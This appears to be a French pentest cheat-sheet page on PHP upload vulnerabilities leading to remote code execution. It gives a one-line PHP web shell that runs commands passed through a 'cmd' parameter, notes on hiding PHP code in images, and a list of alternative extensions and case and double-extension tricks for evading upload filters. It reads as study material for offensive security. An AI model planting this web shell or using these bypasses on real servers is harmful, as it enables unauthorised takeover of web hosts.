# PHP

**Facteur de risque** : RCE

## Description

> **PHP: Hypertext Preprocessor**, plus connu sous son sigle **PHP**, est un "langage de programmation" libre, principalement utilisé pour produire des pages Web dynamiques via un serveur HTTP (*Apache, lighttpd, nginx...*).

## Pré-requis

- Le serveur supporte le PHP

- Pourvoir upload des fichiers

- Accéder à ces fichiers

- Les fichiers stockés doivent être exécutés via PHP (même pour les images)
  
  - Impossible de nos jours. La configuration par défaut de PHP consiste à exécuter l'interpréteur PHP uniquement pour les fichiers .php, à l'aide de NGinx, Apache, Lighttpd etc...

## RCE

Le code PHP suivant permet un RCE :

```php
<?php echo "Shell";system($_GET['cmd']); ?>
```

Si on accédant à ce fichier, le mot Shell apparaît, il y a de grandes chances que le code a été exécuté côté serveur.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité.

[Web Shells 101 Using PHP (Web Shells Part 2) | Acunetix](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)

### Contournement

#### Du code PHP dans un fichier image

Du image (GIF ou JPEG) peut contenir du code PHP. Mais il faut s'assurer que après l'upload, l'image stocké est exécuté avec du PHP. De nos jours, l'interpreteur de PHP n'exécute que les fichiers en .php.

[Setting up PHP-FastCGI and nginx? Don’t trust the tutorials: check your configuration! &raquo; Neal Poole](https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/)

[security - Can a GIF/JPEG file contain runnable PHP code? - Stack Overflow](https://stackoverflow.com/questions/13250471/can-a-gif-jpeg-file-contain-runnable-php-code)

[PHP security exploit with GIF images - PHP Classes](https://www.phpclasses.org/blog/post/67-PHP-security-exploit-with-GIF-images.html)

#### Extensions PHP

Trouver les extension manquantes qui peuvent être exécutées du côté serveur (ou peuvent être dangereuses du côté client)

| Extension |
| --------- |
| .php      |
| .phtml    |
| .php3     |
| .php4     |
| .php5     |
| .php7     |
| .phps     |
| .php-s    |
| .pht      |
| .phar     |
| .phpt     |
| **.pgif** |
| .phtm     |

htm

shtml

xhtml

cgi

Ajouter d'autres payload utilisant d'autre commandes PHP

## Uppercase some letter(s) of the extension

.pHp, .pHP5, .PhAr...

## Double (or more) extension

Useful to bypass misconfigured checks that test if a specific extension is just present
